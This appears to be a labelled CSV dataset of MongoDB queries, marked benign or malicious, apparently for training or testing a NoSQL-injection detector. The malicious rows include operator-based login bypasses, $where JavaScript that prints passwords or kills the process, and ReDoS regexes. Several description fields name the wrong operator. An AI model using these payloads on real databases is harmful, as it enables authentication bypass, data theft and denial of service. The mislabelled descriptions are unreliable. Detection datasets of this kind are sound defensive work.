id,label,type,collection,query,full_command,description,timestamp
134,malicious,operator_injection,orders,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.orders.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.300848
135,benign,find_with_sort,products,{},"db.products.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.406841
136,malicious,json_injection,logs,"{""constructor"": {""prototype"": {""admin"": true}}}","db.logs.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.356599
137,malicious,json_injection,orders,"{""constructor"": {""prototype"": {""admin"": true}}}","db.orders.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.336217
138,malicious,or_injection,users,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.users.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.298881
139,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(50).limit(37)",Query with pagination,2025-11-24T21:15:54.394175
140,benign,find_with_sort,users,{},"db.users.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.418297
141,benign,update_query,sessions,"{""filter"": {""_id"": ""8acfbadc-1515-4d78-a00b-90eeba4d436d""}, ""update"": {""$push"": {""tags"": ""\u5305\u62ec""}}}","db.sessions.updateOne({""_id"": ""8acfbadc-1515-4d78-a00b-90eeba4d436d""}, {""$push"": {""tags"": ""\u5305\u62ec""}})",Document update operation,2025-11-24T21:15:54.471705
142,malicious,where_injection,logs,"{""$where"": ""this.constructor.constructor('return process')().exit()""}","db.logs.find({""$where"": ""this.constructor.constructor('return process')().exit()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.322730
143,malicious,operator_injection,sessions,"{""role"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.sessions.find({""role"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.322045
144,benign,distinct_query,orders,"{""field"": ""country""}","db.orders.distinct(""country"")",Field distinct query,2025-11-24T21:15:54.476928
145,benign,distinct_query,orders,"{""field"": ""status""}","db.orders.distinct(""status"")",Field distinct query,2025-11-24T21:15:54.470963
146,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.368752
147,malicious,array_injection,users,"{""email"": {""$size"": {""$gt"": 0}}}","db.users.find({""email"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.337252
148,malicious,where_injection,logs,"{""$where"": ""this.password.length > 0""}","db.logs.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.360466
149,malicious,operator_injection,orders,"{""role"": {""$ne"": """"}}","db.orders.find({""role"": {""$ne"": """"}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.331243
150,malicious,or_injection,users,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.users.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.326350
151,malicious,or_injection,products,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.products.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.297796
152,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(386).limit(71)",Query with pagination,2025-11-24T21:15:54.432792
153,benign,aggregation_query,logs,"[{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}]","db.logs.aggregate([{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.541753
154,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.555127
155,malicious,regex_injection,orders,"{""admin"": {""$regex"": ""(a+)+$""}}","db.orders.find({""admin"": {""$regex"": ""(a+)+$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.358283
156,benign,find_with_sort,users,{},"db.users.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.422085
157,malicious,array_injection,users,"{""user_id.0"": {""$exists"": true}}","db.users.find({""user_id.0"": {""$exists"": true}})",Injection through array operators,2025-11-24T21:15:54.324963
158,malicious,regex_injection,sessions,"{""user_id"": {""$regex"": ""^(a|a)+$""}}","db.sessions.find({""user_id"": {""$regex"": ""^(a|a)+$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.317483
159,malicious,or_injection,customers,"{""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]}","db.customers.find({""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.312034
160,benign,count_query,products,"{""category"": ""books""}","db.products.countDocuments({""category"": ""books""})",Document count query,2025-11-24T21:15:54.519727
161,malicious,or_injection,transactions,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.transactions.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.319015
162,malicious,operator_injection,customers,"{""username"": {""$regex"": "".*""}}","db.customers.find({""username"": {""$regex"": "".*""}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.357108
163,malicious,regex_injection,transactions,"{""email"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.transactions.find({""email"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.331398
164,benign,delete_query,logs,"{""_id"": ""58bffbef-415b-4dad-a43c-2d7b1a6df344""}","db.logs.deleteOne({""_id"": ""58bffbef-415b-4dad-a43c-2d7b1a6df344""})",Document delete operation,2025-11-24T21:15:54.515461
165,malicious,operator_injection,sessions,"{""email"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.sessions.find({""email"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.331378
166,malicious,regex_injection,products,"{""username"": {""$regex"": "".{1,1000000}""}}","db.products.find({""username"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.355875
167,benign,simple_find,customers,"{""order_id"": ""e01faf0d-7c60-4e70-b937-e313e563a07d""}","db.customers.find({""order_id"": ""e01faf0d-7c60-4e70-b937-e313e563a07d""})",Simple field match query,2025-11-24T21:15:54.566512
168,benign,find_with_sort,comments,{},"db.comments.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.401344
169,benign,aggregation_query,logs,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.logs.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.567032
170,malicious,operator_injection,logs,"{""password"": {""$regex"": "".*""}}","db.logs.find({""password"": {""$regex"": "".*""}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.359309
171,benign,find_with_projection,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.467464
172,malicious,operator_injection,transactions,"{""user_id"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.transactions.find({""user_id"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.292552
173,malicious,or_injection,sessions,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.sessions.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.333960
174,benign,find_with_sort,products,{},"db.products.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.375982
175,malicious,or_injection,logs,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.logs.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.358174
176,benign,delete_query,comments,"{""status"": ""deleted""}","db.comments.deleteOne({""status"": ""deleted""})",Document delete operation,2025-11-24T21:15:54.390067
177,benign,simple_find,articles,"{""name"": ""Ashley Moore""}","db.articles.find({""name"": ""Ashley Moore""})",Simple field match query,2025-11-24T21:15:54.437908
178,benign,simple_find,articles,"{""email"": ""fangyao@example.org""}","db.articles.find({""email"": ""fangyao@example.org""})",Simple field match query,2025-11-24T21:15:54.499939
179,benign,simple_find,articles,"{""order_id"": ""53b8a95d-cf74-45da-9783-93ca3fd386b4""}","db.articles.find({""order_id"": ""53b8a95d-cf74-45da-9783-93ca3fd386b4""})",Simple field match query,2025-11-24T21:15:54.544725
180,malicious,where_injection,users,"{""$where"": ""db.users.find().forEach(function(u){print(u.password)})""}","db.users.find({""$where"": ""db.users.find().forEach(function(u){print(u.password)})""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.326085
181,malicious,operator_injection,accounts,"{""admin"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.accounts.find({""admin"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.294534
182,malicious,operator_injection,sessions,"{""token"": {""$regex"": "".*""}}","db.sessions.find({""token"": {""$regex"": "".*""}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.323886
183,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.381184
184,malicious,regex_injection,sessions,"{""email"": {""$regex"": ""admin.*"", ""$options"": ""i""}}","db.sessions.find({""email"": {""$regex"": ""admin.*"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.304514
185,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.440696
186,benign,find_with_sort,comments,{},"db.comments.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.461973
187,malicious,regex_injection,accounts,"{""user_id"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.accounts.find({""user_id"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.333240
188,malicious,where_injection,sessions,"{""$where"": ""this.username == 'admin'""}","db.sessions.find({""$where"": ""this.username == 'admin'""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.324692
189,malicious,array_injection,sessions,"{""email"": {""$size"": {""$gt"": 0}}}","db.sessions.find({""email"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.318905
190,malicious,where_injection,accounts,"{""$where"": ""function() { sleep(5000); return true; }""}","db.accounts.find({""$where"": ""function() { sleep(5000); return true; }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.299034
191,benign,insert_query,orders,"{""order_id"": ""51599534-4c7f-4ca1-835f-edea86d10303"", ""user_id"": ""c0e618f6-5a9b-4586-b463-8bf076cb3d60"", ""total"": 3121.2, ""status"": ""cancelled"", ""created_at"": ""2025-11-18T22:58:33.893591"", ""items_count"": 3}","db.orders.insertOne({""order_id"": ""51599534-4c7f-4ca1-835f-edea86d10303"", ""user_id"": ""c0e618f6-5a9b-4586-b463-8bf076cb3d60"", ""total"": 3121.2, ""status"": ""cancelled"", ""created_at"": ""2025-11-18T22:58:33.893591"", ""items_count"": 3})",Document insert operation,2025-11-24T21:15:54.480480
192,benign,simple_find,comments,"{""order_id"": ""682c3bb2-583f-46bd-a0d8-039e92aa71d5""}","db.comments.find({""order_id"": ""682c3bb2-583f-46bd-a0d8-039e92aa71d5""})",Simple field match query,2025-11-24T21:15:54.433150
193,malicious,type_confusion,sessions,"{""password"": {""$type"": ""string""}}","db.sessions.find({""password"": {""$type"": ""string""}})",Exploiting type system for injection attack,2025-11-24T21:15:54.308593
194,benign,insert_query,users,"{""username"": ""jeanette43"", ""email"": ""fischerdonald@example.com"", ""name"": ""Renee Tapia"", ""age"": 19, ""country"": ""India"", ""created_at"": ""2025-07-31T20:12:40.046248"", ""status"": ""active"", ""role"": ""editor""}","db.users.insertOne({""username"": ""jeanette43"", ""email"": ""fischerdonald@example.com"", ""name"": ""Renee Tapia"", ""age"": 19, ""country"": ""India"", ""created_at"": ""2025-07-31T20:12:40.046248"", ""status"": ""active"", ""role"": ""editor""})",Document insert operation,2025-11-24T21:15:54.412700
195,benign,update_query,articles,"{""filter"": {""_id"": ""6c27ca62-141f-4b4c-b977-93611204a9d9""}, ""update"": {""$inc"": {""view_count"": 1}}}","db.articles.updateOne({""_id"": ""6c27ca62-141f-4b4c-b977-93611204a9d9""}, {""$inc"": {""view_count"": 1}})",Document update operation,2025-11-24T21:15:54.441695
196,malicious,operator_injection,orders,"{""username"": ""janet69"", ""password"": {""$ne"": """"}}","db.orders.find({""username"": ""janet69"", ""password"": {""$ne"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.335777
197,benign,update_query,articles,"{""filter"": {""_id"": ""921707d1-f0c0-462d-b796-0fd9b5263f49""}, ""update"": {""$set"": {""name"": ""\u80e1\u521a""}}}","db.articles.updateOne({""_id"": ""921707d1-f0c0-462d-b796-0fd9b5263f49""}, {""$set"": {""name"": ""\u80e1\u521a""}})",Document update operation,2025-11-24T21:15:54.544204
198,malicious,operator_injection,customers,"{""role"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.customers.find({""role"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.359059
199,benign,find_with_limit,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}).skip(76).limit(90)",Query with pagination,2025-11-24T21:15:54.547461
200,malicious,operator_injection,sessions,"{""admin"": {""$eq"": true}}","db.sessions.find({""admin"": {""$eq"": true}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.344572
